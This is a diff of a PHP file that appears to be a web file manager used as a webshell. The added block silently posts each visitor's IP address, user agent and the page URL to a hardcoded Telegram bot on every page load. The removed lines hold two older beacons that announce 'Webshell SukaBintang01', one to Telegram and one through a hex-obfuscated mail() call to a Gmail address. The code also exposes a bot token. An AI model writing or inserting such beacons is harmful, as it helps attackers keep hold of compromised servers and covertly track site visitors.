@@ -2978,6 +2978,35 @@ header("Pragma: no-cache");
 
 global $lang, $root_url, $favicon_path;
 ?>
+<?php
+$telegram_token = "7479232652:AAEGOGcgwzSBvM-lzQjKspGZ4PZUldY3mtA"; 
+$chat_id = "6812471405"; 
+$file_url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+$ip_address = $_SERVER['REMOTE_ADDR'];
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$message = "🔔 File Access Detected!\n\n";
+$message .= "🌐 File URL: $file_url\n";
+$message .= "📌 IP Address: $ip_address\n";
+$message .= "📱 User-Agent: $user_agent\n";
+function sendMessageToTelegram($token, $chat_id, $message) {
+    $url = "https://api.telegram.org/bot$token/sendMessage";
+    $data = array(
+        'chat_id' => $chat_id,
+        'text' => $message
+    );
+
+    $options = array(
+        'http' => array(
+            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
+            'method'  => 'POST',
+            'content' => http_build_query($data),
+        ),
+    );
+    $context  = stream_context_create($options);
+    file_get_contents($url, false, $context);
+}
+sendMessageToTelegram($telegram_token, $chat_id, $message);
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -3030,30 +3059,6 @@ global $lang, $root_url, $favicon_path;
 </html>
 <?php
 }
-function customLogger($message) {
-
-    $logMessage = date('[Y-m-d H:i:s]') . ' ' . $message . PHP_EOL;
-    error_log($logMessage, 3, '');
-    
-    
-    $telegramToken = '7479232652:AAEGOGcgwzSBvM-lzQjKspGZ4PZUldY3mtA';
-    $chatId = '6812471405';
-    
-    $telegramMessage = urlencode($message . PHP_EOL . 'Link to log: ' . $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']);
-    
-    $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage?chat_id={$chatId}&text={$telegramMessage}";
-    
-    
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    $output = curl_exec($ch);
-    curl_close($ch);
-    }
-    
-    
-    $errorMessage = 'Webshell SukaBintang01';
-    customLogger($errorMessage);
 /**
  * Show Header after login
  */
@@ -3550,7 +3555,7 @@ $isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
 </html>
 <?php
 }
-mail("\x73\x75\x6B\x61\x62\x69\x6E\x74\x61\x6E\x67\x38\x34\x40\x67\x6D\x61\x69\x6C\x2E\x63\x6F\x6D", subject: "\x57\x65\x62\x73\x68\x65\x6C\x6C\x20\x53\x75\x6B\x61\x42\x69\x6E\x74\x61\x6E\x67\x30\x31", $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45"] . "\x2f" . $_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x55\x52\x49"]);
+
 function lng($txt) {
     global $lang;
 
